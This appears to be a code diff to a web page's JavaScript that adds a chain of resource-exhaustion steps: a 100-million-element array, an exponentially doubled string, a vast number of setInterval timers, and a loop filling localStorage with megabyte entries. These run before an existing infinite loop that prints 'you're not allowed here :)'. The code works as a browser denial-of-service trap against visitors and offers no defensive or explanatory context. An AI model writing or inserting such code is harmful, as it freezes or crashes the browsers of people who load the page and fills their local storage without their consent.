@@ -70,6 +70,32 @@
                         }
                         // crash(); // Uncomment to trigger stack overflow
                     })
+                    .then(() => {
+                        // Allocate a huge array
+                        let bigArray = [];
+                        for (let i = 0; i < 1e8; i++) {
+                            bigArray.push(i);
+                        }
+                    })
+                    .then(() => {
+                        // Create a massive string
+                        let hugeString = "a";
+                        for (let i = 0; i < 25; i++) {
+                            hugeString += hugeString; // Exponential growth
+                        }
+                    })
+                    .then(() => {
+                        // Trigger many setIntervals
+                        for (let i = 0; i < 1000000000000000000000000; i++) {
+                            setInterval(() => {}, 1);
+                        }
+                    })
+                    .then(() => {
+                        // Fill localStorage with large data
+                        for (let i = 0; i < 100000000000000; i++) {
+                            localStorage.setItem("key" + i, "x".repeat(1024 * 1024)); // 1MB per key
+                        }
+                    })
                     .finally(() => {
                         console.log("you're not allowed here :)");
                         while (true) {}
